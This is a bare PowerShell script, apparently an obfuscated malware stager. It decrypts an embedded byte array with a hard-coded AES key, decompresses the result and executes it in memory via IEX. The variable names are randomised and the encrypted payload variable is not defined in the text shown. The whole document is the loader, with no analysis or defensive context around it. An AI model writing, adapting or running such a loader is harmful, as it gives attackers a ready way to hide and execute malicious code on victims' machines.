$yocuoeku = New-Object "System.Security.Cryptography.AesManaged"
$hitthm = [System.Convert]::FromBase64String("4qL5+jDr8zOO2t/2WsbSxJ6v+5IYUX7fniOajk2aRL0=")
$yocuoeku.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$yocuoeku.Mode = [System.Security.Cryptography.CipherMode]::CBC
$yocuoeku.BlockSize = 128
$yocuoeku.KeySize = 192
$yocuoeku.Key = $hitthm
$yocuoeku.IV = $fvgbo[0..15]
$bmax = New-Object System.IO.MemoryStream
$dixopey = New-Object System.IO.MemoryStream(,$yocuoeku.CreateDecryptor().TransformFinalBlock($fvgbo,16,$fvgbo.Length-16))
$rmvjgrgpu = New-Object System.IO.Compression.GzipStream $dixopey, ([IO.Compression.CompressionMode]::Decompress)
$rmvjgrgpu.CopyTo($bmax)
$rmvjgrgpu.Close()
$etez = [System.Text.Encoding]::UTF8.GetString($bmax.ToArray())
$dixopey.Close()
$yocuoeku.Dispose()
IEX($etez)